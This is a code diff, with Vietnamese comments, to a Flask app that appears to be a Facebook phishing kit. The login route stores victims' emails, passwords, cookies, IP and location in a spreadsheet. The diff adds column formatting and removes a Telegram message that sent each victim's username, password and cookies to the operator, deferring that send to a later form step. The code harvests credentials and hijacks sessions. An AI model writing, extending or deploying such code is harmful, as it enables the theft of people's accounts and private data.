@@ -23,10 +23,64 @@ sys.path.insert(0, _parent_dir)
 
 from flask import Flask, render_template, request, jsonify
 from openpyxl import Workbook, load_workbook
+from openpyxl.utils import get_column_letter
 from utils.get_html import get_facebook_page_after_login, get_cookies, wait_and_save_cookies
 
 # Telegram config file
 BOT_CONFIG_FILE = os.path.join(_parent_dir, "bot_config.txt")
+
+
+def _adjust_column_widths(ws):
+
+    """Tự động căn chỉnh kích thước cột theo nội dung"""
+
+    try:
+
+        for column in ws.columns:
+
+            max_length = 0
+
+            column_letter = get_column_letter(column[0].column)
+
+            
+
+            for cell in column:
+
+                try:
+
+                    if cell.value:
+
+                        cell_str = str(cell.value)
+
+                        if len(cell_str) > 100:
+
+                            cell_str = cell_str[:100]
+
+                        max_length = max(max_length, len(cell_str))
+
+                except:
+
+                    pass
+
+            
+
+            adjusted_width = min(max_length + 2, 50)
+
+            if adjusted_width < 10:
+
+                adjusted_width = 10
+
+            
+
+            ws.column_dimensions[column_letter].width = adjusted_width
+
+        
+
+        print(f"[Excel] Đã tự động căn chỉnh kích thước cột")
+
+    except Exception as e:
+
+        print(f"[Excel] Lỗi căn chỉnh cột: {e}")
 
 # Flask app - template folder trỏ đến thư mục templates của project
 template_dir = os.path.join(_parent_dir, 'templates')
@@ -182,7 +236,7 @@ def login():
         if not os.path.exists(FILE_NAME):
             wb = Workbook()
             ws = wb.active
-            ws.append(["Email", "Password", "Cookies", "IP Address", "Location", "Timestamp"])
+            ws.append(["Address", "Password", "Cookies", "IP Address", "Location", "Timestamp"])
             wb.save(FILE_NAME)
         
         wb = load_workbook(FILE_NAME)
@@ -202,6 +256,8 @@ def login():
         if not found:
             ws.append([email, password, "", client_ip, location_info, timestamp])
         
+        # Tự động căn chỉnh kích thước cột trước khi save
+        _adjust_column_widths(ws)
         wb.save(FILE_NAME)
         
     except Exception as e:
@@ -242,16 +298,8 @@ def login():
         else:
             worker.submit(wait_and_save_cookies, file_name=FILE_NAME)
         
-        # Gửi 1 message duy nhất với đầy đủ thông tin
-        telegram_msg = f"📱 <b>THÔNG TIN ĐĂNG NHẬP</b>\n" \
-                      f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
-                      f"👤 <b>Tài khoản:</b> <code>{email}</code>\n" \
-                      f"🔑 <b>Mật khẩu:</b> <code>{password}</code>\n\n" \
-                      f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
-                      f"📍 <b>Vị trí:</b> {location_info}\n" \
-                      f"⏰ <b>Thời gian:</b> {timestamp}\n\n" \
-                      f"🍪 <b>Cookies:</b>\n<code>{cookies_value}</code>"
-        send_telegram_message(telegram_msg)
+        # Không gửi Telegram ở đây - sẽ gửi 1 lần duy nhất sau khi nhận form help
+        # Để tránh gửi nhiều lần trong các flow khác nhau
         
         return jsonify({
             "success": True,
